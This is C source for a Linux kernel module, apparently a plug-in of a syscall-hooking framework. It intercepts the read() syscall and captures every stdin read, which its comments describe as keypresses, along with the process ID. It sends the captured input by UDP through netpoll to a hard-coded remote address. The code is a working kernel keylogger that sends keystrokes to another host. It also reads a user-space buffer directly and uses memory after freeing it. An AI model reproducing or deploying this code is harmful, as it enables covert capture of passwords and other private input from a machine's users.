#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */

#include <linux/string.h>
#include <linux/netpoll.h>
#include <linux/etherdevice.h>

#include "netlog_interceptor.h"
#include "core.h"

#define LOG_PREF "PID %d says: %s\n"
#define MAX_PID_CHARS 10
#define MOD_NAME "netlogger_interceptor"

int pos;
struct netpoll *np;

static void netlogger_send(int pid, char *buf, unsigned int len)
{
	char *msg = NULL;
	int msg_size = 0;

	if (!np)
		return;


	msg_size = strlen(LOG_PREF) + len + MAX_PID_CHARS;
	msg = kzalloc(msg_size, GFP_KERNEL);
	if (!msg)
		return;

	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);

	if (msg_size <= 0) {
		printk(KERN_INFO "Something went wrong\n");
		return;
	}

	netpoll_send_udp(np, msg, msg_size);
	kfree(msg);
}

static void netlogger_init(void)
{
	char target_config[] = "6665@0.0.0.0/eth0,6666@192.168.178.22/ff:ff:ff:ff:ff:ff";
	if (np)
		return;

	np = kzalloc(sizeof(struct netpoll), GFP_KERNEL);
	if (!np)
		return;

	np->name = THIS_MODULE->name;
	strlcpy(np->dev_name, "eth0", IFNAMSIZ);
	np->local_port = 6665;
	np->remote_port = 6666;
	eth_broadcast_addr(np->remote_mac);

	if (netpoll_parse_options(np, target_config))
		goto fail;

	if (netpoll_setup(np))
		goto fail;

	netlogger_send(-1, "netlogger started", 17);
	return;

fail:
	kfree(np);
	np = NULL;
}

static void netlogger_exit(void)
{
	if (!np)
		return;

	netpoll_cleanup(np);
	kfree(np);
	np = NULL;
	netlogger_send(-1, "netlogger exiting", 17);
}

asmlinkage long netlogger_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
{
	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
	if (fd != 0)
		return ret;

	netlogger_send(current->pid, buf, count);
	return ret;
}

void netlogger_command(char *cmd)
{
	/* Command logic goes here */
	
	printk(KERN_INFO MSG_PREF(MOD_NAME)"received %s\n", cmd);
}

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
void interceptor_init(struct orig *original_syscalls)
{
	netlogger_init();

	register_read_instrumenter(netlogger_read_syscall);
	register_command_parser(netlogger_command);

	printk(KERN_INFO MSG_PREF(MOD_NAME)"loaded.\n");
}

/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */

void interceptor_exit(void)
{
	deregister_command_parser(netlogger_command);
	deregister_read_instrumenter(netlogger_read_syscall);

	netlogger_exit();

	printk(KERN_INFO MSG_PREF(MOD_NAME)"unloaded\n");
}
